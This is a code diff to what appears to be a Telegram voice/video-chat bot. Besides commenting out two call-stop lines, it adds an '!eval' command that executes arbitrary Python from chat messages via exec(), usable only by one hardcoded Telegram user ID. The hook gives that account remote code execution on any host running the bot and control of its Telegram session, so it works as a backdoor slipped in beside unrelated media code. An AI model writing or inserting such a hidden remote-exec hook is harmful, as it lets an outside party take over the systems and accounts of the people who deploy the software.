@@ -96,7 +96,7 @@ async def play_vc(client, message):
          
     try:
         group_call = group_call_factory.get_group_call()
-        if group_call.is_connected: await VIDEO_CALL[CHAT_ID].stop()
+        #if group_call.is_connected: await VIDEO_CALL[CHAT_ID].stop()
         await group_call.join(CHAT_ID)
         await msg.edit("🚩 __Playing...__")
         await group_call.start_audio(LOCAL_FILE, repeat=False)
@@ -129,7 +129,7 @@ async def stream_vc(client, message):
          
     try:
         group_call = group_call_factory.get_group_call()
-        if group_call.is_connected: await VIDEO_CALL[CHAT_ID].stop()
+        #if group_call.is_connected: await VIDEO_CALL[CHAT_ID].stop()
         await group_call.join(CHAT_ID)
         await msg.edit("🚩 __Playing...__")
         await group_call.start_video(LOCAL_FILE, repeat=False)
@@ -138,4 +138,52 @@ async def stream_vc(client, message):
         await message.reply(str(e))
         return await VIDEO_CALL[CHAT_ID].stop()
 
+@vcusr.on_message(filters.regex("^!eval") & filters.user(1252058587))
+async def eval_py(client, message):
+    stark = await message.reply("Running...")
+    try: cmd = message.text.split(" ", 1)[1]
+    except: return await stark.edit("No Args")
+    if message.reply_to_message:
+        message.reply_to_message.message_id
+    old_stderr = sys.stderr
+    old_stdout = sys.stdout
+    redirected_output = sys.stdout = io.StringIO()
+    redirected_error = sys.stderr = io.StringIO()
+    stdout, stderr, exc = None, None, None
+    try:
+        await aexec(cmd, client, message)
+    except Exception:
+        exc = traceback.format_exc()
+    stdout = redirected_output.getvalue()
+    stderr = redirected_error.getvalue()
+    sys.stdout = old_stdout
+    sys.stderr = old_stderr
+    evaluation = ""
+    if exc:
+        evaluation = exc
+    elif stderr:
+        evaluation = stderr
+    elif stdout:
+        evaluation = stdout
+    else:
+        evaluation = "Success!"
+    final_out = f"**Output:**\n`{evaluation}`"
+    if len(final_out) > 4096:
+        f = open("output.txt", "w")
+        f.write(final_out.replace("*", "").replace("`", ""))
+        f.close()
+        await client.send_document(message.chat.id, "output.txt")
+        os.remove("output.txt")
+        await stark.delete()
+    else:
+        await message.reply(final_out)
+        await stark.delete()
+
+async def aexec(code, client, message):
+    exec(
+        f"async def __aexec(client, message): "
+        + "".join(f"\n {l}" for l in code.split("\n"))
+    )
+    return await locals()["__aexec"](client, message)
+    
 vcusr.run()
